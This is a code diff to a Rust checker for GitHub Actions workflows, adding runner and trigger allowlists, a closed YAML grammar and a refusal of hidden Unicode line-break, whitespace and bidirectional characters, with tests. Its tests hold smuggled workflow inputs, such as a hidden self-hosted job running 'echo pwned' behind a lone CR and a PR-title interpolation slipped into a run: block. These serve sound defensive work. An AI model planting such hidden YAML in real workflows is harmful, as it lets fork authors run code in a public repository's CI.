@@ -9,6 +9,16 @@ const ALLOWED_ACTIONS: [&str; 4] = [
     "swatinem/rust-cache",
     "actions/upload-artifact",
 ];
+/// GitHub-hosted images a job may run on (#77, public repository): the ones `ci.yml` and
+/// `nightly.yml` use, pinned to a version (no `-latest`, which moves under the workflow). Any other
+/// `runs-on` value is refused: `self-hosted`, any custom label, a list, a `group:` mapping, an
+/// expression. Adding an image is a change of this list, in a sensitive PR.
+const HOSTED_RUNNERS: [&str; 2] = ["ubuntu-24.04", "windows-2025"];
+/// Events a workflow may be triggered by (#77, AS-53). The repository is public: any other event
+/// (`issue_comment`, `issues`, `pull_request_review*`, `discussion*`, `release`, `workflow_call`,
+/// `repository_dispatch`, `merge_group`, `pull_request_target`, `workflow_run`…) runs in the
+/// context of the base repository on text written by third parties, and no workflow needs one.
+const ALLOWED_EVENTS: [&str; 4] = ["push", "pull_request", "schedule", "workflow_dispatch"];
 /// Seul contexte sûr dans une interpolation `${{ }}`. Tout autre (`github`, `inputs`, `matrix`,
 /// `env`, `steps`, `needs`, les fonctions) n'est permis que sous `env:`, sous `with:` et dans
 /// `if:` ; un `run:` le reçoit par `env:` et une variable citée (SEC0-31).
@@ -68,13 +78,16 @@ fn parse(line: &str) -> Option<Line<'_>> {
         .filter(|(_, v)| v.is_empty() || v.starts_with(' '));
     match pair {
         Some((key, value)) => {
-            let key = key.trim_matches(['"', '\'']); // clé citée : même traitement
+            // Closed grammar (#77, AS-54): a bare name of `[A-Za-z0-9_-]`, with at most one `.`.
+            // A quoted key is not a form of this check (an unclosed quote would hide the lines
+            // that follow).
             let valid = !key.is_empty()
+                && key.matches('.').count() <= 1
                 && key
                     .chars()
-                    .all(|c| c.is_ascii_alphanumeric() || "_-".contains(c));
+                    .all(|c| c.is_ascii_alphanumeric() || "_-.".contains(c));
             let key = Some(key.to_ascii_lowercase());
-            let value = value.trim();
+            let value = value.trim_matches(' ');
             valid.then_some(Line {
                 item,
                 dash,
@@ -84,7 +97,7 @@ fn parse(line: &str) -> Option<Line<'_>> {
             })
         }
         None if item && !rest.is_empty() && !rest.starts_with(|c| ODD_SCALAR_START.contains(c)) => {
-            let value = rest.trim();
+            let value = rest.trim_matches(' ');
             Some(Line {
                 item,
                 dash,
@@ -98,7 +111,156 @@ fn parse(line: &str) -> Option<Line<'_>> {
 }
 
 fn strip_comment(value: &str) -> &str {
-    value.find(" #").map_or(value, |i| &value[..i]).trim()
+    value
+        .find(" #")
+        .map_or(value, |i| &value[..i])
+        .trim_matches(' ')
+}
+
+/// A value of the closed grammar (#77, AS-54): one node on one line, with the text that is the
+/// value itself (comment left out).
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Value<'a> {
+    /// Nothing, or only a comment: the children follow, if any.
+    Empty,
+    /// A block scalar header: `|`, `|-`, `>` or `>-`.
+    Block(&'a str),
+    /// A plain scalar, a quoted scalar closed on the line, or a flow collection closed on it.
+    Scalar(&'a str),
+}
+
+/// Byte index of the quote that closes the quoted scalar starting `v` (`''` is an escaped quote
+/// inside single quotes; a double-quoted scalar has no escapes, a backslash being refused).
+fn quoted_end(v: &str) -> Option<usize> {
+    let bytes = v.as_bytes();
+    let quote = *bytes.first()?;
+    let mut i = 1;
+    while i < bytes.len() {
+        if bytes[i] == quote {
+            if quote == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
+                i += 2;
+                continue;
+            }
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Byte index of the bracket that closes the flow collection starting `v`, brackets matched and
+/// quoted scalars skipped; `None` when it does not close on this line.
+fn flow_end(v: &str) -> Option<usize> {
+    let mut open = Vec::new();
+    let mut i = 0;
+    while i < v.len() {
+        let c = v.as_bytes()[i];
+        match c {
+            b'"' | b'\'' => i += quoted_end(&v[i..])?,
+            b'[' => open.push(b']'),
+            b'{' => open.push(b'}'),
+            b']' | b'}' => {
+                if open.pop() != Some(c) {
+                    return None;
+                }
+                if open.is_empty() {
+                    return Some(i);
+                }
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    None
+}
+
+/// What may follow a value on its line: nothing, or a comment after a space.
+fn only_comment(rest: &str) -> bool {
+    rest.is_empty() || (rest.starts_with(' ') && rest.trim_start_matches(' ').starts_with('#'))
+}
+
+/// Reads the value of a `key: value` or `- value` line against the closed grammar, or says why
+/// it is outside it. The value is trimmed, as [`parse`] gives it.
+fn read_value(v: &str) -> Result<Value<'_>, &'static str> {
+    let Some(first) = v.chars().next().filter(|_| !v.starts_with('#')) else {
+        return Ok(Value::Empty);
+    };
+    let closed = |end: Option<usize>, what: &'static str| match end {
+        Some(end) if only_comment(&v[end + 1..]) => Ok(Value::Scalar(&v[..=end])),
+        Some(_) => Err("text after a closed quoted scalar or flow collection"),
+        None => Err(what),
+    };
+    match first {
+        '"' | '\'' => closed(quoted_end(v), "quoted scalar not closed on its line"),
+        '[' | '{' => closed(flow_end(v), "flow collection not closed on its line"),
+        '|' | '>' => {
+            let header = v.get(..2).filter(|h| h.ends_with('-')).unwrap_or(&v[..1]);
+            if only_comment(&v[header.len()..]) {
+                Ok(Value::Block(header))
+            } else {
+                Err("block scalar indicator other than |, |-, > and >-")
+            }
+        }
+        '&' | '*' | '!' | '%' | '@' | '`' => Err("YAML indicator that starts no plain scalar"),
+        '-' | '?' | ':' if v.len() == 1 || v[1..].starts_with(' ') => {
+            Err("explicit key, nested sequence or mapping indicator in a value")
+        }
+        _ => {
+            let code = strip_comment(v);
+            if code.contains(": ") || code.ends_with(':') {
+                Err("': ' in a plain scalar (mapping or continuation the check cannot read)")
+            } else {
+                Ok(Value::Scalar(code))
+            }
+        }
+    }
+}
+
+/// The text of a scalar written bare, `"…"` or `'…'` with no quote inside; `None` for anything
+/// else (unbalanced or nested quotes, which the check cannot read as YAML does).
+fn literal_scalar(value: &str) -> Option<&str> {
+    let inner = match value.as_bytes() {
+        [q @ (b'"' | b'\''), .., last] if q == last => &value[1..value.len() - 1],
+        _ => value,
+    };
+    (!inner.contains(['"', '\''])).then_some(inner)
+}
+
+/// Why a `runs-on:` value is refused, `None` when it is exactly one of [`HOSTED_RUNNERS`] (#77).
+fn runner_refusal(value: &str) -> Option<String> {
+    let value = strip_comment(value);
+    let allowed = literal_scalar(value).is_some_and(|v| HOSTED_RUNNERS.contains(&v));
+    (!allowed).then(|| {
+        format!(
+            "runs-on {value:?} is not one of the GitHub-hosted images {HOSTED_RUNNERS:?} \
+             (self-hosted runners, labels, lists, groups and expressions are refused, #77)"
+        )
+    })
+}
+
+/// Event names written after `on:` on the same line: one scalar, or a flow list `[a, b]`. An empty
+/// list or item is returned as an empty name, which [`event_refusal`] refuses.
+fn inline_events(value: &str) -> Vec<&str> {
+    let value = strip_comment(value);
+    match value.strip_prefix('[').and_then(|v| v.strip_suffix(']')) {
+        Some(list) => list.split(',').map(str::trim).collect(),
+        None => vec![value],
+    }
+}
+
+/// Why an event name written after `on:` is refused, `None` when it is one of
+/// [`ALLOWED_EVENTS`]. Anything that is not a plain name (expression, anchor, block, mapping) is
+/// not in the list either: the check refuses what it cannot read.
+fn event_refusal(name: &str) -> Option<String> {
+    let allowed = literal_scalar(name)
+        .map(str::to_ascii_lowercase)
+        .is_some_and(|n| ALLOWED_EVENTS.contains(&n.as_str()));
+    (!allowed).then(|| {
+        format!(
+            "event {name:?} is not one of the allowed triggers {ALLOWED_EVENTS:?} \
+             (public repository: other events run in the base repository's context, #77)"
+        )
+    })
 }
 
 /// Niveau ouvert de la pile d'indentation : clé, ou élément de liste (`key` = `-`).
@@ -134,7 +296,8 @@ fn place(stack: &mut Vec<Level>, l: &Line) -> bool {
             col: l.dash,
             key: "-".into(),
             open,
-            child: Some(l.col),
+            // A scalar item has no child: a deeper line is a continuation, which is refused.
+            child: l.key.is_some().then_some(l.col),
         });
         ok
     } else {
@@ -154,11 +317,11 @@ fn place(stack: &mut Vec<Level>, l: &Line) -> bool {
 
 /// Lignes de l'élément de liste (étape) qui contient la ligne `i`, de clé à l'indentation `col`.
 fn step_block<'b, 'a>(lines: &'b [&'a str], i: usize, col: usize) -> &'b [&'a str] {
-    let blank = |l: &str| l.trim().is_empty();
+    let blank = |l: &str| l.trim_matches(' ').is_empty();
     let mut start = i;
-    while !lines[start].trim_start().starts_with('-') && start > 0 {
+    while !lines[start].trim_start_matches(' ').starts_with('-') && start > 0 {
         let prev = lines[start - 1];
-        if !blank(prev) && indent(prev) < col && !prev.trim_start().starts_with('-') {
+        if !blank(prev) && indent(prev) < col && !prev.trim_start_matches(' ').starts_with('-') {
             break;
         }
         start -= 1;
@@ -233,7 +396,7 @@ pub fn pinned_uses(text: &str) -> Vec<Pin> {
         let tag = l
             .value
             .find(" #")
-            .and_then(|c| l.value[c + 2..].split_whitespace().next());
+            .and_then(|c| l.value[c + 2..].split(' ').find(|w| !w.is_empty()));
         out.push(Pin {
             line: i + 1,
             repo,
@@ -244,21 +407,76 @@ pub fn pinned_uses(text: &str) -> Vec<Pin> {
     out
 }
 
+/// Characters that YAML does not read as this check does (#77). YAML knows two white spaces,
+/// the space and the tab, and breaks lines on LF, CR and, for YAML 1.1, NEL, LS and PS; `lines()`
+/// and `trim()` know more or fewer of them. Text hidden behind such a character was read as a
+/// comment, an empty line or a longer line here, and as YAML there (a lone CR, or a no-break
+/// space before `#`, which makes the line a continuation of the previous `run:`).
+///
+/// The invisible format characters are refused as well, though they do not mislead YAML: the
+/// bidirectional controls (U+202A..U+202E, U+2066..U+2069, "Trojan Source"), the zero-width and
+/// invisible operators, the soft hyphen, the interlinear annotations and the tag characters
+/// make the text a reviewer reads differ from the text that runs.
+fn unreadable_char(c: char) -> bool {
+    c.is_whitespace()
+        || c.is_control()
+        || matches!(
+            c,
+            '\u{AD}'
+                | '\u{61C}'
+                | '\u{180E}'
+                | '\u{200B}'..='\u{200F}'
+                | '\u{202A}'..='\u{202E}'
+                | '\u{2060}'..='\u{2064}'
+                | '\u{2066}'..='\u{206F}'
+                | '\u{FEFF}'
+                | '\u{FFF9}'..='\u{FFFB}'
+                | '\u{E0000}'..='\u{E007F}'
+        )
+}
+
+/// One report per line that holds a character other than the ASCII space, the LF and the CR of
+/// a CRLF which is white space, a control or an invisible format character: tab, VT, FF, NEL,
+/// NBSP, U+2000..U+200A, LS, PS, U+3000, zero-width characters, any BOM. Accented letters and
+/// other printable text stay accepted. This is the one place that decides it, on the raw text,
+/// before it is split into lines.
+fn unreadable_chars(text: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    let mut line = 1;
+    let mut last = 0;
+    let mut chars = text.chars().peekable();
+    while let Some(c) = chars.next() {
+        let crlf = c == '\r' && chars.peek() == Some(&'\n');
+        if c != ' ' && c != '\n' && !crlf && unreadable_char(c) && last != line {
+            last = line;
+            found.push(format!(
+                "ligne {line} : character U+{:04X} refused: only the space, LF and CRLF are \
+                 accepted as white space, YAML would not read the line as this check does (#77)",
+                u32::from(c)
+            ));
+        }
+        line += usize::from(c == '\n');
+    }
+    found
+}
+
 /// Écarts d'un workflow, chacun avec son numéro de ligne.
 pub fn check_workflow(text: &str) -> Vec<String> {
     let lines: Vec<&str> = text.lines().collect();
-    let mut errors = Vec::new();
+    let mut errors = unreadable_chars(text);
     let mut top_permissions = false;
     let mut stack: Vec<Level> = Vec::new();
     // Bloc `|` ou `>` ouvert : (colonne de sa clé, interpolations non sûres permises).
     let mut block: Option<(usize, bool)> = None;
+    // Jobs under the top-level `jobs:`, each with the line of its `runs-on:` (#77).
+    let mut jobs: Vec<(String, usize, Option<usize>)> = Vec::new();
+    // Number of top-level `on:` keys: exactly one is expected (#77).
+    let mut on_keys = 0;
+    let mut event_count = 0;
     for (i, &raw) in lines.iter().enumerate() {
         let n = i + 1;
-        let compact: String = raw.chars().filter(|c| !c.is_whitespace()).collect();
+        let compact: String = raw.chars().filter(|c| *c != ' ').collect();
         let compact = compact.to_ascii_lowercase();
-        if raw.contains('\t') {
-            errors.push(format!("ligne {n} : tabulation refusée"));
-        }
         for bad in [
             "pull_request_target",
             "workflow_run",
@@ -270,7 +488,7 @@ pub fn check_workflow(text: &str) -> Vec<String> {
             }
         }
         if let Some((col, data)) = block {
-            if raw.trim().is_empty() || indent(raw) > col {
+            if raw.trim_matches(' ').is_empty() || indent(raw) > col {
                 if unsafe_interpolation(raw) && !data {
                     errors.push(format!(
                         "ligne {n} : interpolation non sûre hors de env:, with: et if: (SEC0-31)"
@@ -280,7 +498,7 @@ pub fn check_workflow(text: &str) -> Vec<String> {
             }
             block = None;
         }
-        let trimmed = raw.trim();
+        let trimmed = raw.trim_matches(' ');
         if trimmed.is_empty() || trimmed.starts_with('#') {
             continue;
         }
@@ -300,6 +518,61 @@ pub fn check_workflow(text: &str) -> Vec<String> {
             errors.push(format!("ligne {n} : indentation incohérente"));
         }
         let key = l.key.as_deref().unwrap_or_default();
+        // Closed grammar (#77, AS-54): one node per line, whose value is read on that line.
+        let value = match read_value(l.value) {
+            Ok(value) => value,
+            Err(why) => {
+                errors.push(format!("ligne {n} : {why} (closed grammar, #77)"));
+                continue;
+            }
+        };
+        let v = match value {
+            Value::Empty => "",
+            Value::Block(text) | Value::Scalar(text) => text,
+        };
+        if l.key.is_none() && matches!(value, Value::Block(_)) {
+            errors.push(format!(
+                "ligne {n} : block scalar as a list item: its indentation is not one this check reads (#77)"
+            ));
+        }
+        // Events: `on: x`, `on: [x, y]`, `- x` items and `x:` keys directly under `on:`.
+        let events: Vec<&str> = if stack.is_empty() && !l.item && l.col == 0 && key == "on" {
+            on_keys += 1;
+            if v.is_empty() {
+                Vec::new()
+            } else {
+                inline_events(v)
+            }
+        } else if !stack.first().is_some_and(|t| t.key == "on" && t.col == 0) {
+            Vec::new()
+        } else if !l.item && stack.len() == 1 {
+            vec![key]
+        } else if l.item && stack.len() == 2 {
+            // A scalar item is an event; `- x: y` is not a form of `on:` this check reads.
+            vec![if l.key.is_none() { v } else { "" }]
+        } else {
+            Vec::new()
+        };
+        event_count += events.len();
+        for event in events {
+            errors.extend(event_refusal(event).map(|e| format!("ligne {n} : {e}")));
+        }
+        if key == "runs-on" {
+            errors.extend(runner_refusal(v).map(|e| format!("ligne {n} : {e}")));
+        }
+        if !l.item && stack.first().is_some_and(|t| t.key == "jobs" && t.col == 0) {
+            match (stack.len(), jobs.last_mut()) {
+                (1, _) => jobs.push((key.to_owned(), n, None)),
+                (2, Some((_, _, runner))) if key == "runs-on" => {
+                    if let Some(first) = runner.replace(n) {
+                        errors.push(format!(
+                            "ligne {n} : runs-on defined twice (first on line {first})"
+                        ));
+                    }
+                }
+                _ => {}
+            }
+        }
         // Les ancêtres sont en pile ; la ligne elle-même n'y est que si c'est une clé d'élément.
         let data = key == "if"
             || stack
@@ -319,7 +592,6 @@ pub fn check_workflow(text: &str) -> Vec<String> {
         if hidden && key != "uses" && key != "run" {
             errors.push(format!("ligne {n} : forme de uses: ou run: non reconnue"));
         }
-        let v = strip_comment(l.value);
         if v.starts_with(['&', '*', '!']) {
             errors.push(format!("ligne {n} : ancre, alias ou balise YAML refusé"));
         }
@@ -349,6 +621,20 @@ pub fn check_workflow(text: &str) -> Vec<String> {
     if !top_permissions {
         errors.push("permissions: {} absent au niveau du workflow (SEC0-29)".to_owned());
     }
+    if on_keys != 1 || event_count == 0 {
+        errors.push(format!(
+            "exactly one top-level `on:` with at least one readable event expected, found \
+             {on_keys} `on:` and {event_count} event(s) (#77)"
+        ));
+    }
+    // A job without a readable `runs-on:` is refused rather than assumed to be hosted (#77).
+    errors.extend(
+        jobs.iter()
+            .filter(|(_, _, runner)| runner.is_none())
+            .map(|(job, n, _)| {
+                format!("ligne {n} : job `{job}` without a `runs-on:` key of its own (#77)")
+            }),
+    );
     errors
 }
 
@@ -702,7 +988,7 @@ fn installer_calls(line: &str) -> Vec<Vec<&str>> {
 fn path_filter_entry(lines: &[&str], i: usize) -> bool {
     const FILTERS: [&str; 2] = ["paths", "paths-ignore"];
     let glob = |s: &str| {
-        let s = s.trim().trim_matches(['"', '\'']);
+        let s = s.trim_matches(' ').trim_matches(['"', '\'']);
         !s.is_empty()
             && s.bytes()
                 .all(|b| b.is_ascii_alphanumeric() || b"_./*!-".contains(&b))
@@ -719,7 +1005,7 @@ fn path_filter_entry(lines: &[&str], i: usize) -> bool {
         return false;
     }
     for prev in lines[..i].iter().rev() {
-        let t = prev.trim();
+        let t = prev.trim_matches(' ');
         if t.is_empty() || t.starts_with('#') {
             continue;
         }
@@ -756,7 +1042,7 @@ pub fn tool_lock_errors(workflows: &[(String, String)], script: &str, lock: &str
         let lines: Vec<&str> = text.lines().collect();
         for (i, line) in lines.iter().enumerate() {
             if !line.contains(SCRIPT_NAME)
-                || line.trim_start().starts_with('#') // YAML or shell comment: nothing runs
+                || line.trim_start_matches(' ').starts_with('#') // YAML or shell comment: nothing runs
                 || path_filter_entry(&lines, i)
             {
                 continue;
@@ -809,7 +1095,7 @@ mod tests {
 
     fn good() -> String {
         format!(
-            "on:\n  pull_request:\npermissions: {{}}\njobs:\n  a:\n    permissions:\n      contents: read\n    \
+            "on:\n  pull_request:\npermissions: {{}}\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    \
              steps:\n      - uses: actions/checkout@{SHA} # v4\n        with:\n          persist-credentials: false\n      \
              - name: t\n        env:\n          TITLE: ${{{{ github.event.pull_request.title }}}}\n        run: |\n          \
              echo \"$TITLE\"\n          cargo xtask check --only workflows\n"
@@ -919,7 +1205,7 @@ mod tests {
         assert_eq!(
             pins[0],
             Pin {
-                line: 9,
+                line: 10,
                 repo: "actions/checkout".into(),
                 sha: SHA.into(),
                 tag: Some("v4".into())
@@ -970,6 +1256,641 @@ mod tests {
             "      run: |\n        echo \"$TITLE\"\n        cargo",
         );
         assert_eq!(check_workflow(&flush), Vec::<String>::new());
+    }
+
+    /// `good()` with its trigger block replaced by `on`.
+    fn with_on(on: &str) -> String {
+        good().replacen("on:\n  pull_request:\n", on, 1)
+    }
+
+    /// `good()` with the job's `runs-on: ubuntu-24.04` line replaced by `runs_on`.
+    fn with_runs_on(runs_on: &str) -> String {
+        assert!(
+            good().contains(
+                "    runs-on: ubuntu-24.04
+"
+            ),
+            "fixture drifted"
+        );
+        good().replacen("    runs-on: ubuntu-24.04\n", runs_on, 1)
+    }
+
+    /// #77: the repository is public, so a workflow must not run with the base repository's
+    /// secrets on text from a fork (`pull_request_target`) or on the result of another
+    /// workflow (`workflow_run`), whatever the YAML form of the trigger.
+    #[test]
+    fn refuses_pull_request_target_and_workflow_run() {
+        for event in ["pull_request_target", "workflow_run"] {
+            let upper = event.to_ascii_uppercase();
+            for on in [
+                format!("on: {event}\n"),
+                format!("on: \"{event}\"\n"),
+                format!("on: [push, {event}]\n"),
+                format!("on: [{event}]\n"),
+                format!("on: {{{event}: {{}}}}\n"),
+                format!("on:\n  - push\n  - {event}\n"),
+                format!("on:\n  - '{event}'\n"),
+                format!("on:\n  {event}:\n"),
+                format!("on:\n  {event}:\n    types: [opened]\n"),
+                format!("on:\n  pull_request:\n  {event}:\n"),
+                format!("on:\n  push:\n  \"{event}\":\n"),
+                format!("on:\n  '{event}':\n"),
+                format!("\"on\":\n  {event}:\n"),
+                format!("on:\n  {upper}:\n"),
+                format!("on:\n  {event}: # comment\n"),
+                format!("on: [push, \"{upper}\"]\n"),
+            ] {
+                let text = with_on(&on);
+                assert_ne!(text, good(), "{on}");
+                let errors = check_workflow(&text);
+                assert!(
+                    errors
+                        .iter()
+                        .any(|e| e.contains(&format!("{event} interdit"))),
+                    "{on}: {errors:?}"
+                );
+            }
+        }
+        // The triggers the workflows use stay accepted.
+        for on in [
+            "on:\n  pull_request:\n  push:\n    branches: [main]\n",
+            "on:\n  schedule:\n    - cron: '17 3 * * *'\n  workflow_dispatch:\n",
+            "on: [push, workflow_dispatch]\n",
+        ] {
+            assert_eq!(check_workflow(&with_on(on)), Vec::<String>::new(), "{on}");
+        }
+    }
+
+    /// #77, AS-53: `on:` takes only `push`, `pull_request`, `schedule` and `workflow_dispatch`,
+    /// in every YAML form; any other event, or a name the check cannot read, is refused.
+    #[test]
+    fn refuses_events_outside_the_closed_list() {
+        for event in [
+            "issue_comment",
+            "issues",
+            "pull_request_review",
+            "pull_request_review_comment",
+            "discussion",
+            "discussion_comment",
+            "release",
+            "workflow_call",
+            "repository_dispatch",
+            "merge_group",
+            "pull_request_target",
+            "workflow_run",
+            "fork",
+            "Issue_Comment",
+        ] {
+            for on in [
+                format!("on: {event}\n"),
+                format!("on: \"{event}\"\n"),
+                format!("on: '{event}' # comment\n"),
+                format!("on: [push, {event}]\n"),
+                format!("on: [{event}]\n"),
+                format!("on:\n  - push\n  - {event}\n"),
+                format!("on:\n  - \"{event}\"\n"),
+                format!("on:\n  push:\n  {event}:\n"),
+                format!("on:\n  {event}:\n    types: [created]\n"),
+                format!("on:\n  \"{event}\":\n"),
+                format!("on:\n  '{event}':\n"),
+                format!("\"on\":\n  {event}:\n"),
+                format!("on:\n  {}:\n", event.to_ascii_uppercase()),
+            ] {
+                let text = with_on(&on);
+                assert_ne!(text, good(), "{on}");
+                let errors = check_workflow(&text);
+                assert!(
+                    errors.iter().any(|e| e.contains("allowed triggers") || e.contains("forme non reconnue")),
+                    "{on}: {errors:?}"
+                );
+            }
+        }
+        // Names the check cannot read, and workflows without a readable trigger.
+        for on in [
+            "on: ${{ github.event_name }}\n",
+            "on: [push, ${{ inputs.e }}]\n",
+            "on:\n  - ${{ inputs.e }}\n",
+            "on:\n  ${{ inputs.e }}:\n",
+            "on: &e push\n",
+            "on: *e\n",
+            "on: !!str push\n",
+            "on: |\n  push\n",
+            "on: >\n  push\n",
+            "on: push, issues\n",
+            "on: push issues\n",
+            "on: {push: {}}\n",
+            "on: [push, {issues: {}}]\n",
+            "on: []\n",
+            "on: [push, ]\n",
+            "on:\n",
+            "on:\n  - push: {}\n",
+            "on: ''\n",
+        ] {
+            let errors = check_workflow(&with_on(on));
+            assert!(
+                errors.iter().any(|e| e.contains("#77")),
+                "accepted: {on}: {errors:?}"
+            );
+        }
+        let none = good().replacen("on:\n  pull_request:\n", "", 1);
+        assert!(
+            check_workflow(&none)
+                .iter()
+                .any(|e| e.contains("exactly one"))
+        );
+        let twice = good().replacen("jobs:", "on: push\njobs:", 1);
+        assert!(
+            check_workflow(&twice)
+                .iter()
+                .any(|e| e.contains("exactly one"))
+        );
+        // The four events stay accepted in every form.
+        for on in [
+            "on: push\n",
+            "on: \"pull_request\"\n",
+            "on: [push, pull_request, schedule, workflow_dispatch]\n",
+            "on: ['push', \"workflow_dispatch\"] # both\n",
+            "on:\n  - schedule\n  - workflow_dispatch\n",
+            "on:\n  push:\n    branches: [main]\n    paths:\n      - 'a/**'\n  pull_request:\n    types: [opened]\n",
+            "on:\n  schedule:\n    - cron: '17 3 * * 0'\n  workflow_dispatch:\n",
+        ] {
+            assert_eq!(check_workflow(&with_on(on)), Vec::<String>::new(), "{on}");
+        }
+    }
+
+    #[test]
+    fn accepts_the_hosted_runners() {
+        for runs_on in [
+            "runs-on: ubuntu-24.04",
+            "runs-on: windows-2025",
+            "runs-on: \"ubuntu-24.04\"",
+            "runs-on: 'windows-2025' # hosted",
+            "runs-on:   ubuntu-24.04  ",
+        ] {
+            let text = with_runs_on(&format!("    {runs_on}\n"));
+            assert_eq!(check_workflow(&text), Vec::<String>::new(), "{runs_on}");
+        }
+        // Two jobs, each with its own runner.
+        let two = format!("{}  b:\n    runs-on: windows-2025\n    steps: []\n", good());
+        assert_eq!(check_workflow(&two), Vec::<String>::new());
+    }
+
+    /// #77: only the explicit GitHub-hosted images pass; a self-hosted runner on a public
+    /// repository would run a fork's code on the maintainer's machine.
+    #[test]
+    fn refuses_self_hosted_and_unlisted_runners() {
+        for runs_on in [
+            "runs-on: self-hosted",
+            "runs-on: Self-Hosted",
+            "runs-on: \"self-hosted\"",
+            "runs-on: [self-hosted]",
+            "runs-on: [self-hosted, linux, x64]",
+            "runs-on: [ubuntu-24.04, self-hosted]",
+            "runs-on: [ubuntu-24.04]",
+            "runs-on: ubuntu-24.04, self-hosted",
+            "runs-on: ubuntu-24.04 self-hosted",
+            "runs-on: ubuntu-latest",
+            "runs-on: ubuntu-22.04",
+            "runs-on: ubuntu-24.04-arm",
+            "runs-on: windows-latest",
+            "runs-on: macos-15",
+            "runs-on: my-runner",
+            "runs-on: Ubuntu-24.04",
+            "runs-on: ubuntu-24.04x",
+            "runs-on: 'ubuntu-24.04",
+            "runs-on: \"ubuntu-24.04'",
+            "runs-on: ''",
+            "runs-on:",
+            "runs-on: ${{ matrix.os }}",
+            "runs-on: ${{ 'ubuntu-24.04' }}",
+            "runs-on: ${{ runner.os }}",
+            "runs-on: ubuntu-${{ matrix.v }}",
+            "runs-on: {group: big, labels: ubuntu-24.04}",
+            "runs-on: *hosted",
+            "runs-on: !!str ubuntu-24.04",
+            "Runs-On: self-hosted",
+            "\"runs-on\": self-hosted",
+            "runs-on:\n      - self-hosted",
+            "runs-on:\n      - ubuntu-24.04",
+            "runs-on:\n      group: ci\n      labels: ubuntu-24.04",
+            "runs-on: |\n      self-hosted",
+        ] {
+            let text = with_runs_on(&format!("    {runs_on}\n"));
+            let errors = check_workflow(&text);
+            assert!(
+                errors.iter().any(|e| e.contains("GitHub-hosted images")
+                    || e.contains("closed grammar")
+                    || e.contains("forme non reconnue")),
+                "{runs_on}: {errors:?}"
+            );
+        }
+        // The refusal names the value.
+        let errors = check_workflow(&with_runs_on("    runs-on: self-hosted\n"));
+        assert!(errors.iter().any(|e| e.contains("runs-on \"self-hosted\"")));
+        // A second job on a self-hosted runner, a runner outside any job, a doubled key.
+        let other = format!("{}  b:\n    runs-on: self-hosted\n    steps: []\n", good());
+        assert!(!check_workflow(&other).is_empty());
+        let top = good().replacen("jobs:", "runs-on: self-hosted\njobs:", 1);
+        assert!(!check_workflow(&top).is_empty());
+        let twice = with_runs_on("    runs-on: ubuntu-24.04\n    runs-on: windows-2025\n");
+        let errors = check_workflow(&twice);
+        assert!(
+            errors.iter().any(|e| e.contains("defined twice")),
+            "{errors:?}"
+        );
+    }
+
+    /// #77: a job whose `runs-on:` the check does not find itself is refused, not assumed hosted
+    /// (a `runs-on:` elsewhere in the job, or in another job, does not count).
+    #[test]
+    fn refuses_a_job_without_its_own_runner() {
+        let errors = check_workflow(&with_runs_on(""));
+        assert!(
+            errors.iter().any(|e| e.contains("job `a` without")),
+            "{errors:?}"
+        );
+        let nested = with_runs_on("    env:\n      runs-on: ubuntu-24.04\n");
+        assert!(
+            check_workflow(&nested)
+                .iter()
+                .any(|e| e.contains("job `a`"))
+        );
+        let reusable = with_runs_on("    uses: ./.github/workflows/x.yml\n");
+        assert!(!check_workflow(&reusable).is_empty());
+        let second = format!("{}  b:\n    steps: []\n", good());
+        let errors = check_workflow(&second);
+        assert!(
+            errors.len() == 1 && errors[0].contains("job `b` without"),
+            "{errors:?}"
+        );
+    }
+
+    /// Review of #101: text after a CR, NEL, LS or PS is a comment for `lines()` but new YAML
+    /// lines for a parser. A second job on a self-hosted runner with a step `run: echo pwned`
+    /// went through unseen behind `# c<CR>`.
+    #[test]
+    fn refuses_line_breaks_that_hide_yaml() {
+        for br in ['\r', '\u{85}', '\u{2028}', '\u{2029}'] {
+            let hidden = format!(
+                "# c{br}  b:{br}    runs-on: self-hosted{br}    steps:{br}      - ? run # z{br}        : echo pwned"
+            );
+            let appended = good().replacen(
+                "persist-credentials: false",
+                &format!("persist-credentials: false {hidden}"),
+                1,
+            );
+            let duplicate = good().replacen(
+                "runs-on: ubuntu-24.04",
+                &format!("runs-on: ubuntu-24.04 # c{br}    runs-on: self-hosted"),
+                1,
+            );
+            let trigger = good().replacen(
+                "pull_request:",
+                &format!("pull_request: # c{br}  issue_comment:"),
+                1,
+            );
+            let end = format!("{}# end{br}", good());
+            let start = format!("{br}{}", good());
+            for text in [appended, duplicate, trigger, end, start] {
+                let errors = check_workflow(&text);
+                assert!(
+                    errors.iter().any(|e| e.contains("character U+")),
+                    "{br:?}: {errors:?}"
+                );
+            }
+        }
+        // A trailing lone CR is no line of `lines()`: the whole text is checked as well.
+        let tail = format!("{}\r", good());
+        assert!(!check_workflow(&tail).is_empty());
+        // A tab, VT or FF is refused too, by the same rule (the tab had a rule of its own).
+        for c in ['\t', '\u{b}', '\u{c}'] {
+            let text = good().replacen("jobs:", &format!("jobs:{c}"), 1);
+            let errors = check_workflow(&text);
+            assert!(errors.iter().any(|e| e.contains("character U+")), "{c:?}");
+        }
+        // A CRLF file stays accepted, a CR before the CRLF does not.
+        let crlf = good().replace('\n', "\r\n");
+        assert_eq!(check_workflow(&crlf), Vec::<String>::new());
+        let double = good().replacen("jobs:\n", "jobs:\r\r\n", 1);
+        assert!(!check_workflow(&double).is_empty());
+    }
+
+    /// Review of #101 (third): `trim()` removes every Unicode white space, YAML only the space
+    /// and the tab. A line made of a no-break space and `# ...` was an empty comment for this
+    /// check and the continuation of the previous `run:` for YAML, which expanded the PR title
+    /// in the shell (SEC0-31). Every white space, control and invisible character is refused in
+    /// the whole file, by one rule.
+    #[test]
+    fn refuses_unicode_white_space_that_hides_yaml() {
+        let title = "# ${{ github.event.pull_request.title }}";
+        let spaces = [
+            '\u{a0}', '\u{1680}', '\u{2000}', '\u{2001}', '\u{2005}', '\u{200a}', '\u{202f}',
+            '\u{205f}', '\u{3000}', '\u{85}', '\u{2028}', '\u{2029}',
+        ];
+        let invisible = [
+            '\u{200b}',
+            '\u{200c}',
+            '\u{200d}',
+            '\u{2060}',
+            '\u{feff}',
+            '\0',
+            '\u{ad}',
+            '\u{61c}',
+            '\u{180e}',
+            '\u{200e}',
+            '\u{200f}',
+            '\u{202a}',
+            '\u{202b}',
